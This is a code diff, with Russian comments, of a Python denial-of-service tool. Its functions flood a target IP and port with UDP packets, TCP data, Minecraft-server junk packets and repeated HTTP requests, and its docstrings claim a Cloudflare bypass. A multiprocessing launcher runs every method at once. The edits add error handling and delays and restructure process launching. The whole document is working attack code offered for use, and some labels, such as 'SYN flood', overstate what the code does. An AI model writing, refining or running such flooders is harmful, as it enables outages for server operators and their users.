@@ -18,7 +18,6 @@ def animate(stop_event, target_ip, target_port, protocol, duration, workers):
         sys.stdout.flush()
         time.sleep(0.5)
 
-# Layer 4 - UDP Flood
 def send_udp_packets(target_ip, target_port, packet_size=1024, duration=10):
     """Функция для отправки множества UDP-пакетов."""
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -28,13 +27,13 @@ def send_udp_packets(target_ip, target_port, packet_size=1024, duration=10):
     while time.time() < end_time:
         try:
             sock.sendto(packet, (target_ip, target_port))  # Отправка пакетов
+            time.sleep(0.01)  # Маленькая задержка между отправками пакетов
         except Exception as e:
             print(f"{Fore.RED}❌ Ошибка UDP: {e}{Style.RESET_ALL}")
             break
     
     sock.close()
 
-# Layer 4 - TCP SYN Flood
 def tcp_syn_flood(target_ip, target_port, duration):
     """Атака TCP-SYN flood."""
     print(f"{Fore.YELLOW}🚨 Запущена атака TCP-SYN на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
@@ -44,10 +43,15 @@ def tcp_syn_flood(target_ip, target_port, duration):
     
     end_time = time.time() + duration
     while time.time() < end_time:
-        sock.send(b"\x00\x00\x00\x00")  # Отправка SYN пакета
+        try:
+            sock.send(b"\x00\x00\x00\x00")  # Отправка SYN пакета
+            time.sleep(0.01)  # Маленькая задержка между отправками пакетов
+        except Exception as e:
+            print(f"{Fore.RED}❌ Ошибка TCP-SYN: {e}{Style.RESET_ALL}")
+            break
     sock.close()
 
-# Layer 7 - Minecraft
+# Minecraft Layer 7 Floods
 def mc_cps_flood(target_ip, target_port, duration):
     """Flood CPS (Clicks per second) для Minecraft серверов."""
     print(f"{Fore.YELLOW}🚨 Запущена атака MC-CPS на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
@@ -56,41 +60,44 @@ def mc_cps_flood(target_ip, target_port, duration):
     
     end_time = time.time() + duration
     while time.time() < end_time:
-        sock.send(random._urandom(1024))  # Отправка случайных данных (как имитация CPS)
-    sock.close()
-
-def mc_join_flood(target_ip, target_port, duration):
-    """Flood Join запросов для Minecraft серверов."""
-    print(f"{Fore.YELLOW}🚨 Запущена атака MC-JOIN на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((target_ip, target_port))
-    
-    end_time = time.time() + duration
-    while time.time() < end_time:
-        # Пример Join пакета
-        sock.send(b"\x00\x00\x00\x00")  
+        try:
+            sock.send(random._urandom(1024))  # Отправка случайных данных (как имитация CPS)
+            time.sleep(0.01)  # Маленькая задержка между отправками пакетов
+        except Exception as e:
+            print(f"{Fore.RED}❌ Ошибка MC-CPS: {e}{Style.RESET_ALL}")
+            break
     sock.close()
 
 def mc_ping_flood(target_ip, target_port, duration):
-    """Flood Ping запросов для Minecraft серверов."""
+    """Flood Ping пакетов для Minecraft серверов."""
     print(f"{Fore.YELLOW}🚨 Запущена атака MC-PING на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((target_ip, target_port))
     
     end_time = time.time() + duration
     while time.time() < end_time:
-        sock.send(b"\x01\x00\x00\x00")  # Пример Ping пакета
+        try:
+            sock.send(b"\x01\x00\x00\x00")  # Пример Ping пакета
+            time.sleep(0.01)  # Маленькая задержка между отправками пакетов
+        except Exception as e:
+            print(f"{Fore.RED}❌ Ошибка MC-PING: {e}{Style.RESET_ALL}")
+            break
     sock.close()
 
 def mc_handshake_flood(target_ip, target_port, duration):
-    """Flood Handshake запросов для Minecraft серверов."""
+    """Flood Handshake пакетов для Minecraft серверов."""
     print(f"{Fore.YELLOW}🚨 Запущена атака MC-HANDSHAKE на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((target_ip, target_port))
     
     end_time = time.time() + duration
     while time.time() < end_time:
-        sock.send(b"\x00\x01\x02\x03\x04")  # Пример Handshake пакета
+        try:
+            sock.send(b"\x00\x01\x02\x03\x04")  # Пример Handshake пакета
+            time.sleep(0.01)  # Маленькая задержка между отправками пакетов
+        except Exception as e:
+            print(f"{Fore.RED}❌ Ошибка MC-HANDSHAKE: {e}{Style.RESET_ALL}")
+            break
     sock.close()
 
 def mc_tcpbypass_flood(target_ip, target_port, duration):
@@ -101,87 +108,80 @@ def mc_tcpbypass_flood(target_ip, target_port, duration):
     
     end_time = time.time() + duration
     while time.time() < end_time:
-        sock.send(random._urandom(1024))  # Отправка произвольных TCP пакетов
+        try:
+            sock.send(random._urandom(1024))  # Отправка произвольных TCP пакетов
+            time.sleep(0.01)  # Маленькая задержка между отправками пакетов
+        except Exception as e:
+            print(f"{Fore.RED}❌ Ошибка MC-TCPBYPASS: {e}{Style.RESET_ALL}")
+            break
     sock.close()
 
-# Layer 7 - HTTP
+# HTTP Layer 7 Floods
 def http_out_flood(target_ip, target_port, duration):
-    """HTTP-OUT flood для обхода защиты."""
+    """Strong HTTP flood with Cloudflare bypass method."""
     print(f"{Fore.YELLOW}🚨 Запущена атака HTTP-OUT на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((target_ip, target_port))
     
-    headers = "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".format(target_ip)
+    headers = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\nConnection: keep-alive\r\n\r\n"
     end_time = time.time() + duration
     while time.time() < end_time:
-        sock.send(headers.encode())
+        try:
+            sock.send(headers.encode())
+            time.sleep(0.01)  # Маленькая задержка между отправками пакетов
+        except Exception as e:
+            print(f"{Fore.RED}❌ Ошибка HTTP-OUT: {e}{Style.RESET_ALL}")
+            break
     sock.close()
 
 def http_misc_flood(target_ip, target_port, duration):
-    """Universal HTTP flood для обхода защиты Cloudflare и других."""
+    """Universal HTTP flood for Cloudflare Managed/Interactive bypass."""
     print(f"{Fore.YELLOW}🚨 Запущена атака HTTP-MISC на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((target_ip, target_port))
     
-    headers = "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".format(target_ip)
+    headers = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\nConnection: keep-alive\r\n\r\n"
     end_time = time.time() + duration
     while time.time() < end_time:
-        sock.send(headers.encode())
+        try:
+            sock.send(headers.encode())
+            time.sleep(0.01)  # Маленькая задержка между отправками пакетов
+        except Exception as e:
+            print(f"{Fore.RED}❌ Ошибка HTTP-MISC: {e}{Style.RESET_ALL}")
+            break
     sock.close()
 
-# Run all protocols
 def run_all_protocols(target_ip, target_port, duration, workers):
     """Запуск всех протоколов и методов атак."""
+    process_list = []
     for _ in range(workers):
-        process_list = []
         process_list.append(multiprocessing.Process(target=send_udp_packets, args=(target_ip, target_port, 1024, duration)))
         process_list.append(multiprocessing.Process(target=tcp_syn_flood, args=(target_ip, target_port, duration)))
         process_list.append(multiprocessing.Process(target=mc_cps_flood, args=(target_ip, target_port, duration)))
-        process_list.append(multiprocessing.Process(target=mc_join_flood, args=(target_ip, target_port, duration)))
         process_list.append(multiprocessing.Process(target=mc_ping_flood, args=(target_ip, target_port, duration)))
         process_list.append(multiprocessing.Process(target=mc_handshake_flood, args=(target_ip, target_port, duration)))
         process_list.append(multiprocessing.Process(target=mc_tcpbypass_flood, args=(target_ip, target_port, duration)))
         process_list.append(multiprocessing.Process(target=http_out_flood, args=(target_ip, target_port, duration)))
         process_list.append(multiprocessing.Process(target=http_misc_flood, args=(target_ip, target_port, duration)))
-        
-        # Запуск процессов
-        for process in process_list:
-            process.start()
+    
+    for process in process_list:
+        process.start()
 
-        # Ожидание завершения всех процессов
-        for process in process_list:
-            process.join()
+    for process in process_list:
+        process.join()
 
 def run_attack(target_ip, target_port, protocol, duration, workers):
     """Функция для запуска многопоточной и многопроцессорной атаки."""
     process_list = []
-    stop_event = threading.Event()
-    anim_thread = threading.Thread(target=animate, args=(stop_event, target_ip, target_port, protocol, duration, workers), daemon=True)
-    anim_thread.start()
-
+    stop_event = multiprocessing.Event()
+    animation_thread = threading.Thread(target=animate, args=(stop_event, target_ip, target_port, protocol, duration, workers))
+    animation_thread.start()
+    
     if protocol == "ALL":
-        # Все методы для атаки ALL
         run_all_protocols(target_ip, target_port, duration, workers)
-        return
-    
-    for _ in range(workers):
-        if protocol == "UDP":
-            process = multiprocessing.Process(target=send_udp_packets, args=(target_ip, target_port, 1024, duration))
-        elif protocol == "TCP":
-            process = multiprocessing.Process(target=tcp_syn_flood, args=(target_ip, target_port, duration))
-        else:
-            print(f"{Fore.RED}🚨 Ошибка: поддерживаемые протоколы - TCP, UDP, ALL{Style.RESET_ALL}")
-            return
-        
-        process.start()
-        process_list.append(process)
-    
-    for process in process_list:
-        process.join()
     
     stop_event.set()
-    sys.stdout.write("\r")
-    sys.stdout.flush()
+    animation_thread.join()
 
 def banner():
     """Вывод баннера"""
